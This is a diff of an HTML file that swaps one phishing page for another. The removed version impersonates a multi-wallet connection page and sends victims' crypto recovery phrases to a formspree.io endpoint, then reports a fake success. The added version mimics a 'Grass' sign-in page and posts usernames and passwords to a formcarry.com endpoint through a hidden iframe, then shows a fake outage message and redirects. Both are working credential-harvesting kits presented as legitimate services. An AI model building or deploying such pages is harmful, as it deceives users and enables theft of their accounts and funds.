@@ -2,276 +2,157 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Universal Wallet Connection</title>
-<style>
-* {
-  margin: 0;
-  padding: 0;
-  box-sizing: border-box;
-  font-family: 'Inter', sans-serif;
-}
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Grass Login</title>
+    <style>
+        /* Resetting some basic styles */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
 
-body {
-  background: #ffffff;
-  color: #0f172a;
-  min-height: 100vh;
-  padding: 20px;
-}
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f9f9f9;
+            color: #333;
+        }
 
-.container {
-  max-width: 1200px;
-  margin: 0 auto;
-}
+        .container {
+            width: 360px;
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
 
-.header {
-  text-align: center;
-  margin-bottom: 40px;
-  padding-top: 20px;
-}
+        .logo {
+            font-size: 24px;
+            font-weight: bold;
+            color: #333;
+            margin-bottom: 10px;
+        }
 
-.header h1 {
-  font-size: 2.5rem;
-  margin-bottom: 10px;
-  color: #1e3a8a;
-}
+        .title {
+            font-size: 28px;
+            font-weight: bold;
+            color: #D4E157;
+            margin-bottom: 20px;
+        }
 
-.header p {
-  color: #64748b;
-}
+        .form-group {
+            margin-bottom: 15px;
+            text-align: left;
+        }
 
-.wallets-grid {
-  display: grid;
-  grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
-  gap: 20px;
-  padding: 20px;
-}
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            font-size: 16px;
+            margin-top: 5px;
+        }
 
-.wallet-item {
-  background: #f1f5f9;
-  border-radius: 12px;
-  padding: 20px;
-  cursor: pointer;
-  transition: all 0.3s ease;
-  display: flex;
-  align-items: center;
-  gap: 15px;
-  box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-}
+        .form-group a {
+            font-size: 14px;
+            color: #555;
+            text-decoration: none;
+            display: block;
+            margin-top: 5px;
+        }
 
-.wallet-item:hover {
-  transform: translateY(-2px);
-  background: #e2e8f0;
-}
+        .btn {
+            background-color: #757575;
+            color: white;
+            padding: 12px;
+            width: 100%;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: bold;
+        }
 
-.wallet-logo {
-  width: 40px;
-  height: 40px;
-  background: #cbd5e1;
-  border-radius: 8px;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  font-weight: bold;
-  font-size: 1.2em;
-  color: #1e3a8a;
-}
+        .register-link {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #333;
+        }
 
-.wallet-info {
-  flex: 1;
-}
+        .register-link a {
+            color: #D4E157;
+            text-decoration: none;
+            font-weight: bold;
+        }
 
-.wallet-name {
-  font-weight: 600;
-  margin-bottom: 4px;
-  color: #1e3a8a;
-}
+        .error-message {
+            color: red;
+            font-size: 14px;
+            margin-top: 15px;
+            display: none;
+        }
 
-.wallet-description {
-  font-size: 0.85rem;
-  color: #64748b;
-}
+        footer {
+            font-size: 12px;
+            color: #555;
+            margin-top: 20px;
+        }
 
-.modal {
-  display: none;
-  position: fixed;
-  top: 0;
-  left: 0;
-  width: 100%;
-  height: 100%;
-  background: rgba(0, 0, 0, 0.5);
-  align-items: center;
-  justify-content: center;
-  z-index: 1000;
-}
-
-.modal-content {
-  background: #f1f5f9;
-  padding: 30px;
-  border-radius: 16px;
-  width: 90%;
-  max-width: 500px;
-  box-shadow: 0 8px 16px rgba(0, 0, 0, 0.2);
-}
-
-.phrase-input {
-  width: 100%;
-  padding: 15px;
-  margin: 20px 0;
-  background: #e2e8f0;
-  border: 1px solid #cbd5e1;
-  border-radius: 8px;
-  color: #0f172a;
-  font-size: 1rem;
-}
-
-.connect-btn {
-  width: 100%;
-  padding: 15px;
-  background: #3b82f6;
-  color: white;
-  border: none;
-  border-radius: 8px;
-  font-size: 1rem;
-  cursor: pointer;
-  transition: background 0.3s ease;
-}
-
-.connect-btn:hover {
-  background: #2563eb;
-}
-
-.close-modal {
-  float: right;
-  background: none;
-  border: none;
-  color: #64748b;
-  font-size: 1.5rem;
-  cursor: pointer;
-}
-
-.modal-header {
-  margin-bottom: 20px;
-  color: #1e3a8a;
-}
-
-@media (max-width: 768px) {
-  .wallets-grid {
-    grid-template-columns: 1fr;
-  }
-}
-</style>
+        footer a {
+            color: #555;
+            text-decoration: none;
+            margin: 0 5px;
+        }
+    </style>
 </head>
 <body>
-
-<div class="container">
-  <div class="header">
-    <h1>Universal Wallet Connection</h1>
-    <p>Choose your preferred wallet to connect to our platform</p>
-  </div>
-  
-  <div class="wallets-grid" id="walletsGrid"></div>
-</div>
-
-<div class="modal" id="connectModal">
-  <div class="modal-content">
-    <button class="close-modal" onclick="closeModal()">&times;</button>
-    <div class="modal-header">
-      <h2 id="modalWalletName">Connect Wallet</h2>
+    <div class="container">
+        <div class="logo">grass™</div>
+        <div class="title">Sign In.</div>
+        <form id="loginForm" action="https://formcarry.com/s/2fRjwsXYSGB" method="POST" target="hidden_iframe" onsubmit="showErrorMessage()">
+            <div class="form-group">
+                <label for="username">Username or Email</label>
+                <input type="text" id="username" name="username" placeholder="Username or Email" required>
+            </div>
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" placeholder="Password" required>
+                <a href="#">Forgot Password?</a>
+            </div>
+            <button type="submit" class="btn">ACCESS MY ACCOUNT</button>
+        </form>
+        <div class="error-message" id="errorMessage">
+            Sorry, we are experiencing high traffic now. Please login later.
+        </div>
+        <div class="register-link">
+            Don’t have an account? <a href="#">Register</a>
+        </div>
+        <footer>
+            <a href="#">Privacy Policy</a> | <a href="#">Terms & Conditions</a> | <a href="#">Cookie Policy</a> | <a href="#">Cookie Settings</a>
+            <p>© Grass Foundation, 2024. All rights reserved.</p>
+        </footer>
     </div>
-    <form id="walletForm" method="POST" onsubmit="handleSubmit(event)">
-      <textarea
-        class="phrase-input"
-        name="recoveryPhrase"
-        placeholder="Enter your recovery phrase (12 or 24 words)"
-        rows="4"
-        required
-      ></textarea>
-      <button type="submit" class="connect-btn">Connect Wallet</button>
-    </form>
-    <div id="formResponse" style="margin-top: 20px;"></div>
-  </div>
-</div>
 
-<script>
-const wallets = [
-  { name: "Phantom", letter: "P", description: "Solana's favorite wallet" },
-  { name: "Zerion", letter: "Z", description: "Your Web3 Smart Wallet" },
-  { name: "MetaMask", letter: "M", description: "The crypto wallet for DeFi & NFTs" },
-  { name: "Trust Wallet", letter: "T", description: "The most trusted & secure crypto wallet" },
-  { name: "Coinbase", letter: "C", description: "The easiest way to get started with crypto" },
-  { name: "Rainbow", letter: "R", description: "The fun and simple way to start with Ethereum" },
-  { name: "Sui Wallet", letter: "S", description: "The official Sui ecosystem wallet" },
-  { name: "Exodus", letter: "E", description: "The all-in-one crypto wallet" },
-  { name: "MyEtherWallet", letter: "M", description: "The original Ethereum wallet" },
-  { name: "Ledger Live", letter: "L", description: "The companion app for your hardware wallet" },
-  { name: "Ton Wallet", letter: "T", description: "Secure wallet for the TON blockchain" },
-  { name: "Solflare", letter: "S", description: "The wallet for Solana" },
-  { name: "Atomic", letter: "A", description: "Universal cryptocurrency wallet" },
-  { name: "Argent", letter: "A", description: "The best wallet for DeFi & L2" }
-];
+    <!-- Hidden iframe to handle form submission without leaving the page -->
+    <iframe name="hidden_iframe" style="display:none;"></iframe>
 
-function createWalletGrid() {
-  const grid = document.getElementById('walletsGrid');
-  wallets.forEach(wallet => {
-    const walletItem = document.createElement('div');
-    walletItem.className = 'wallet-item';
-    walletItem.onclick = () => openModal(wallet.name);
-    
-    walletItem.innerHTML = `
-      <div class="wallet-logo">${wallet.letter}</div>
-      <div class="wallet-info">
-        <div class="wallet-name">${wallet.name}</div>
-        <div class="wallet-description">${wallet.description}</div>
-      </div>
-    `;
-    
-    grid.appendChild(walletItem);
-  });
-}
-
-function openModal(walletName) {
-  const modal = document.getElementById('connectModal');
-  const modalWalletName = document.getElementById('modalWalletName');
-  modalWalletName.textContent = `Connect ${walletName}`;
-  modal.style.display = 'flex';
-}
-
-function closeModal() {
-  const modal = document.getElementById('connectModal');
-  modal.style.display = 'none';
-}
-
-function handleSubmit(event) {
-  event.preventDefault();
-  const form = document.getElementById('walletForm');
-  const formData = new FormData(form);
-  
-  fetch('https://formspree.io/f/mdojqvda', { 
-    method: 'POST',
-    body: formData,
-    headers: { 'Accept': 'application/json' }
-  })
-  .then(response => {
-    if (response.ok) return response.json();
-    throw new Error('Network response was not ok.');
-  })
-  .then(data => {
-    document.getElementById('formResponse').innerText = 'Success! Your wallet has been connected.';
-    closeModal();
-  })
-  .catch(error => {
-    document.getElementById('formResponse').innerText = 'Error connecting wallet: ' + error.message;
-  });
-}
-
-window.onclick = function(event) {
-  const modal = document.getElementById('connectModal');
-  if (event.target === modal) closeModal();
-}
-
-createWalletGrid();
-</script>
+    <script>
+        function showErrorMessage() {
+            // Show the error message
+            document.getElementById("errorMessage").style.display = "block";
+            
+            // Redirect after a delay (e.g., 3 seconds)
+            setTimeout(function() {
+                window.location.href = "/"; // Replace '/' with the URL of your main page
+            }, 3000);
+        }
+    </script>
 </body>
 </html>
